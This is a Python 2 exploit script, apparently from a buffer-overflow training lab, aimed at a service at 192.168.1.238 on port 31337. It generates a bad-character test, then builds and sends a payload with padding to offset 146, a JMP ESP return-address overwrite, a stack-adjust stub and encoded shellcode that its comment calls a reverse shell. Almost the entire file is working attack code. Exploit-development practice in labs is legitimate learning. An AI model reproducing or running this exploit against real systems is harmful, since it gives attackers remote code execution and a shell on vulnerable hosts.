#!/usr/bin/python
import socket
import struct

#set up the IP and port to connect to
RHOST = "192.168.1.238" 
RPORT = 31337

#set up the IP and port to connect to
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

#build a message

badchar_test = "" #start with empty string

#determined these to be bad characters, one is a null bye and the other one is new string that will be interpreted by the program

badchars = [0x00, 0x0A]  

#generate the string using a for loop 
for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
	if i not in badchars: #skip the badchars
		badchar_test += chr(i) #append each non-badchar char to the string.

#open a file for writing ('w') the string as binary ('b') data
with open("badchar_test.bin", "wb") as f:
	f.write(badchar_test)

buf_totlen = 1024
offset_srp = 146

ptr_jmp_esp = 0x80414C3

sub_esp_10 = "\x83\xec\x10"

shellcode =  ""
shellcode += "\xbf\xce\x8a\x84\x62\xda\xcc\xd9\x74\x24\xf4\x58"
shellcode += "\x33\xc9\xb1\x52\x31\x78\x12\x03\x78\x12\x83\x26"
shellcode += "\x76\x66\x97\x4a\x6f\xe5\x58\xb2\x70\x8a\xd1\x57"
shellcode += "\x41\x8a\x86\x1c\xf2\x3a\xcc\x70\xff\xb1\x80\x60"
shellcode += "\x74\xb7\x0c\x87\x3d\x72\x6b\xa6\xbe\x2f\x4f\xa9"
shellcode += "\x3c\x32\x9c\x09\x7c\xfd\xd1\x48\xb9\xe0\x18\x18"
shellcode += "\x12\x6e\x8e\x8c\x17\x3a\x13\x27\x6b\xaa\x13\xd4"
shellcode += "\x3c\xcd\x32\x4b\x36\x94\x94\x6a\x9b\xac\x9c\x74"
shellcode += "\xf8\x89\x57\x0f\xca\x66\x66\xd9\x02\x86\xc5\x24"
shellcode += "\xab\x75\x17\x61\x0c\x66\x62\x9b\x6e\x1b\x75\x58"
shellcode += "\x0c\xc7\xf0\x7a\xb6\x8c\xa3\xa6\x46\x40\x35\x2d"
shellcode += "\x44\x2d\x31\x69\x49\xb0\x96\x02\x75\x39\x19\xc4"
shellcode += "\xff\x79\x3e\xc0\xa4\xda\x5f\x51\x01\x8c\x60\x81"
shellcode += "\xea\x71\xc5\xca\x07\x65\x74\x91\x4f\x4a\xb5\x29"
shellcode += "\x90\xc4\xce\x5a\xa2\x4b\x65\xf4\x8e\x04\xa3\x03"
shellcode += "\xf0\x3e\x13\x9b\x0f\xc1\x64\xb2\xcb\x95\x34\xac"
shellcode += "\xfa\x95\xde\x2c\x02\x40\x70\x7c\xac\x3b\x31\x2c"
shellcode += "\x0c\xec\xd9\x26\x83\xd3\xfa\x49\x49\x7c\x90\xb0"
shellcode += "\x1a\x43\xcd\xbb\x70\x2b\x0c\xbb\x85\x17\x99\x5d"
shellcode += "\xef\x77\xcc\xf6\x98\xee\x55\x8c\x39\xee\x43\xe9"
shellcode += "\x7a\x64\x60\x0e\x34\x8d\x0d\x1c\xa1\x7d\x58\x7e"
shellcode += "\x64\x81\x76\x16\xea\x10\x1d\xe6\x65\x09\x8a\xb1"
shellcode += "\x22\xff\xc3\x57\xdf\xa6\x7d\x45\x22\x3e\x45\xcd"
shellcode += "\xf9\x83\x48\xcc\x8c\xb8\x6e\xde\x48\x40\x2b\x8a"
shellcode += "\x04\x17\xe5\x64\xe3\xc1\x47\xde\xbd\xbe\x01\xb6"
shellcode += "\x38\x8d\x91\xc0\x44\xd8\x67\x2c\xf4\xb5\x31\x53"
shellcode += "\x39\x52\xb6\x2c\x27\xc2\x39\xe7\xe3\xe2\xdb\x2d"
shellcode += "\x1e\x8b\x45\xa4\xa3\xd6\x75\x13\xe7\xee\xf5\x91"
shellcode += "\x98\x14\xe5\xd0\x9d\x51\xa1\x09\xec\xca\x44\x2d"
shellcode += "\x43\xea\x4c"

buf = ""
buf += "A"*(offset_srp - len(buf)) #padding
buf += struct.pack("<I",ptr_jmp_esp) #SRP overwrite using struct pack that does little endian work for me
buf += sub_esp_10 #ESP points here 
buf += shellcode #shellcode variable that has reverse shell
buf += "D"*(buf_totlen - len(buf)) #trailing padding
buf += "\n"

#send the message
s.send(buf)

#print what we sent

print "Sent: {0}".format(buf)

#receive some data from socket
data = s.recv(1024)

#print out what received
print "Received: {0}".format(data)
